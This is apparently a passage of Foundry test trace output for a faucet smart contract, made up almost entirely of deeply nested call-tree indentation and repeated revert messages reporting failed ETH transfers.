    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] transfer to main contract failed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Revert] RaiseBoxFaucet_EthTransferFailed()
